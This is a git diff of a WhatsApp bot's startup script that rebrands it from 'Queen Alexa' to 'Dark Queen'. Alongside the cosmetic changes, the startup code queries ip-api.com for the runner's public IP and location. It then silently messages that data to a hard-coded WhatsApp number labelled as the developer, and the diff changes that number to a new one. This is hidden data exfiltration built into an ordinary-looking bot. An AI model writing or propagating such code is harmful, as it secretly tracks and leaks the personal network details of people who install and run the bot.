@@ -37,7 +37,7 @@ const setting = JSON.parse(fs.readFileSync('./settings.json'))
 const { version, bugs } = require('./package.json')
 
 //ngak penting tapi jangan lu hapus
-    const banner=cfonts["render"](("Queen          Alexa"),{font:"block",color:"white",align:"center",gradient:["red","yellow"],lineHeight:2})
+    const banner=cfonts["render"](("Dark          Queen"),{font:"block",color:"white",align:"center",gradient:["red","yellow"],lineHeight:2})
 
 const starts = async (hyper = new WAConnection()) => {
 
@@ -53,26 +53,26 @@ const starts = async (hyper = new WAConnection()) => {
     })
     console.log()
     fs.existsSync('./session.json') && hyper.loadAuthInfo('./session.json')
-    console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
+    console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'DarkWinzo'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       hyper.sendMessage("94767043432@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94767043432?text=welcome"}}})
+       hyper.sendMessage("94717301848@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94767043432?text=welcome"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
     hyper.on('connecting', () => {
     console.log()
-        start('2', '🔴 LOADING CONNECT KKK')
+        start('2', '🔴 LOADING CONNECT DARK-WINZO BOT')
     })
     hyper.on('open', () => {
     success('2', 'Connected')
     setTimeout( () => {
           console.log()
-      	  console.log(color(`🔴 TERHUBUNG KE WHATSAPP KAK BOT NYA`, 'red'))
+      	  console.log(color(`🔴 CONNECT TO THE WHATSAPP DARK-WINZO BOT`, 'red'))
       	    	}, 1000)    		    	     	
     }) 
 
     hyper.on('chat-update', async (message) => {
-        require('./Queen-Alexa.js')(hyper, message)
+        require('./Dark-Queen.js')(hyper, message)
     })
     
     await hyper.connect({timeoutMs: 30*1000})
